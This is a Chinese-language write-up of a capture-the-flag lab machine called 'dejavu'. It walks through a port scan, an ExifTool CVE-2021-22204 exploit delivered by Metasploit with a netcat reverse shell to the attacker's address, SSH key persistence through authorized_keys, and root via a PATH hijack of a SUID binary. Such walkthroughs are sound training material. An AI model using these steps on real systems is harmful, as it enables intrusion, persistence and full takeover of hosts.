# dejavu



**掃描**
```
rustscan -a 10.10.220.150 -- -sV
```

```
22/tcp open  ssh     syn-ack OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

```




**F12找到**
```

<!--
        What should happen when we click on a picture of a dog? 
        How do we style it to make it show that it's clickable?
    -->
```




**目錄爆破**
```
dirsearch -w /usr/share/dirb/wordlists/big.txt -u http://10.10.220.150
發現upload 目錄
```






**圖片相關API response，找到ExifTool版本**
```
http://10.10.220.150/dog/getexifdata/0
ExifToolVersion
ExifTool 12.23
```

**找到CVE-2021-22204**
```
https://www.exploit-db.com/exploits/50911
```



**圖片上傳地址**
```
http://10.10.220.150/upload
```


**MSF生成圖片**

```
search CVE-2021-22204

use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection

set lhost 10.18.1.192

set payload payload/cmd/unix/reverse_netcat 

run 

```


**上傳後，並不會觸發，而是當使用者點選圖片後，後端會去後端解析圖片，才會觸發**
```
nc -lvnp 4444    
```




**SUID 二進位具有特殊權限，允許程式使用setuid系統呼叫。該setuid呼叫允許進程設定其用戶 ID。如果您呼叫 setuid(0) 且該進程具有正確的權限，則程式將以 root 身分執行。**

```
find / -type f -perm -4000 2>/dev/null


/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/crontab
/usr/sbin/grub2-set-bootflag
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/home/dogpics/serverManager

```



**進入目錄**
```
cd /home/dogpics

ls -al
total 7024
drwx------. 6 dogpics dogpics    4096 Sep 11  2021 .
drwxr-xr-x. 4 root    root         38 Sep 11  2021 ..
lrwxrwxrwx. 1 dogpics dogpics       9 Sep 11  2021 .bash_history -> /dev/null
-rw-r--r--. 1 dogpics dogpics      18 May 27  2021 .bash_logout
-rw-r--r--. 1 dogpics dogpics     141 May 27  2021 .bash_profile
-rw-r--r--. 1 dogpics dogpics     376 May 27  2021 .bashrc
drwxr-xr-x. 2 dogpics dogpics     165 Sep 11  2021 dogImages
drwxr-xr-x. 8 dogpics dogpics    4096 Sep 11  2021 exiftool
drwxr-xr-x. 4 dogpics dogpics     172 Sep 11  2021 resources
-rwsr-sr-x. 1 root    root      17648 Sep 11  2021 serverManager
-rw-r--r--. 1 dogpics dogpics     847 Sep 11  2021 serverManager.c
-rw-r--r--. 1 dogpics dogpics     913 Sep 11  2021 staticDogs.json
-rwxrwxr-x. 1 dogpics dogpics      13 Sep 11  2021 systemctl
drwxr-xr-x. 2 dogpics dogpics      28 Jan  9 07:57 temp
-rw-rw-r--  1 dogpics dogpics      41 Sep 11  2021 user.txt
-rwxr-xr-x. 1 dogpics dogpics 7123123 Sep 11  2021 webserver
-rw-r--r--. 1 dogpics dogpics    6825 Sep  4  2021 webserver.go
```





**關鍵**
```
-rwsr-sr-x. 1 root    root      17648 Sep 11  2021 serverManager
-rw-r--r--. 1 dogpics dogpics     847 Sep 11  2021 serverManager.c
```




**serverManager.c**

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{   
    setuid(0);
    setgid(0);
    printf(
        "Welcome to the DogPics server manager Version 1.0\n"
        "Please enter a choice:\n");
    int operation = 0;
    printf(
        "0 -\tGet server status\n"
        "1 -\tRestart server\n");
    while (operation < 48 || operation > 49) {
        operation = getchar();
        getchar();
        if (operation < 48 || operation > 49) {
            printf("Invalid choice.\n");
        }
    }
    operation = operation - 48;
    //printf("Choice was:\t%d\n",operation);
    switch (operation)
    {
    case 0:
        //printf("0\n");
        system("systemctl status --no-pager dogpics");
        break;
    case 1:
        system("sudo systemctl restart dogpics");
        break;
    default:
        break;
    }
}
```


**邏輯**
```
當 operation 的值為 0 時，執行 system("systemctl status --no-pager dogpics");，這條命令用於查看名為 "dogpics" 的 systemd 服務的狀態。

當 operation 的值為 1 時，執行 system("sudo systemctl restart dogpics");，這條命令用於以超級用戶權限重新啟動名為 "dogpics" 的 systemd 服務。
```


------------------------------------------------------------------

**查看所有正在運行服務**
```
systemctl --type=service --state=running

UNIT                       LOAD   ACTIVE SUB     DESCRIPTION                         
amazon-ssm-agent.service   loaded active running amazon-ssm-agent                    
auditd.service             loaded active running Security Auditing Service           
chronyd.service            loaded active running NTP client/server                   
crond.service              loaded active running Command Scheduler                   
dbus.service               loaded active running D-Bus System Message Bus            
dogpics.service            loaded active running Dog pictures                        
firewalld.service          loaded active running firewalld - dynamic firewall daemon 
getty@tty1.service         loaded active running Getty on tty1                       
NetworkManager.service     loaded active running Network Manager                     
polkit.service             loaded active running Authorization Manager               
rngd.service               loaded active running Hardware RNG Entropy Gatherer Daemon
serial-getty@ttyS0.service loaded active running Serial Getty on ttyS0               
sshd.service               loaded active running OpenSSH server daemon               
sssd.service               loaded active running System Security Services Daemon     
systemd-journald.service   loaded active running Journal Service                     
systemd-logind.service     loaded active running Login Service                       
systemd-udevd.service      loaded active running udev Kernel Device Manager          
tuned.service              loaded active running Dynamic System Tuning Daemon   
```


**看到**
```
dogpics.service            loaded active running Dog pictures   
```



**大致上列舉的差不多了。**




**netcat shell 不好用，反正對方開了SSH 我們就生成私鑰登入穩定shell。**

```
mkdir .ssh

cd .ssh

ssh-keygen

//生成 複製私鑰
id_rsa
id_rsa.pub

生成 複製私鑰到kali
cat id_rsa

受害者主機複製公鑰 為 authorized_keys 
cp id_rsa.pub authorized_keys 

```

每个用户可以在其 .ssh 目录下创建一个名为 authorized_keys 的文件，将允许访问其帐户的公钥添加到其中。

authorized_keys 文件是用于存储SSH公钥的文件，通常位于用户的家目录下的 .ssh 子目录中。这个文件的名称是一个约定，是SSH协议规定的默认文件名

当一个用户希望通过SSH连接到远程服务器时，SSH服务器会检查用户的私钥是否与服务器上的 authorized_keys 文件中的任何公钥匹配。如果匹配成功，用户将被允许进行SSH登录。



**kali主機給私鑰權限**
```
chmod 600 id_rsa
```


**SSH連接成功，穩定shell**
```
ssh  dogpics@10.10.220.150  -i id_rsa
```

------------------------------------------------------------------



**我們知道serverManager會去調用以下命令**
```
system("systemctl status --no-pager dogpics");
system("sudo systemctl restart dogpics");

```

**總之這隻程式有SUID 而且使用了 setuid(0);  他產生的子進程都會繼承root權限。
所以我們可以竄改 systemctl，他沒有使用絕對路徑**


```
which systemctl
/usr/bin/systemctl

```


**查看環境變數**
```
echo $PATH 

/home/dogpics/.local/bin:/home/dogpics/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/usr/local/go/bin
```


**建立一個systemctl文件，其內容/bin/bash將在執行時啟動 shell。**
```
echo '/bin/bash' > systemctl 
```


**將.（我們目前的工作目錄）加入到 PATH 的開頭**
```
export PATH=.:$PATH
```


**在確認多了當前目錄**
```
echo $PATH 

.:/home/dogpics/.local/bin:/home/dogpics/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/usr/local/go/bin
```





**此時輸入 serverManager 程式參數的0或1，拿到root**

```
serverManager
```

